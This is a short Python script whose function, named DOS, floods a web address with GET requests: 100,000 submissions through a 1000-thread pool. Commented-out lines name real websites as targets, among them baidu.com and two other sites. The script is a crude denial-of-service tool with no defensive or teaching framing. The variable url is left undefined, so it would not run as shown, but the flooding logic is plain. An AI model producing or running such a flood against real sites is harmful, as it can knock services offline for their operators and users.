from concurrent.futures.thread import ThreadPoolExecutor

import requests

# url = "http://www.eversunshine.cn/"
# url = "https://static-4c89007f-af34-418a-909e-be456bf03b70.bspapp.com/#/"
# url = "https://www.baidu.com/"


def DOS():
    # resp = requests.get(url, timeout=3)
    # print(resp.text)
    # print(data)
    resp = requests.get(url)
    print(resp.text)


if __name__ == "__main__":
    with ThreadPoolExecutor(1000) as t:
        for i in range(100000):
            t.submit(DOS)
